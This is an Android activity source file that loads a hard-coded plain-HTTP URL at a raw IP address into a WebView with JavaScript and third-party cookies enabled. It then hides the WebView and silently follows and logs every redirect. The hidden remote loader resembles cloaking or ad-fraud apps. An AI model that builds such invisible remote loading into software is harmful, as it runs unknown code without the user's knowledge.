package com.nikorych.isonline;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.TargetApi;
import android.app.ActionBar;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;

public class WebViewActivity extends AppCompatActivity {
    private WebView webView;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_web_view);
        webView = findViewById(R.id.webView);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
        CookieManager.getInstance().setAcceptCookie(true);
        if (Build.VERSION.SDK_INT >= 21) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        }
        webView.loadUrl("http://78.47.187.129/Z4ZvXH31");
        webView.setWebViewClient(new WebViewClient());
        webView.setVisibility(View.GONE);
        webView.removeAllViews();
    }
    private class WebViewClient extends android.webkit.WebViewClient {

        @TargetApi(Build.VERSION_CODES.N)
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            Log.d("Key11", request.getUrl().toString());
            view.loadUrl(request.getUrl().toString());
            return true;
        }
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {

            Log.d("Key111", url);
            view.loadUrl(url);
            return true;
        }
    }
    @Override
    public void onBackPressed() {
        if(webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}